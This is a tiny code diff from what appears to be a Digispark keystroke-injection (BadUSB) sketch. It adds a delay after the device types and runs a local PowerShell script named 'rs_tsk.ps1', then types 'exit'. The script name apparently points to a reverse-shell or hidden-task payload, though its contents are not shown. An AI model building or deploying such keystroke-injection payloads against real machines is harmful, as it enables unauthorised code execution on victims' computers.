@@ -46,6 +46,7 @@ void loop(){
   
   DigiKeyboard.print("C:\\rs_tsk.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
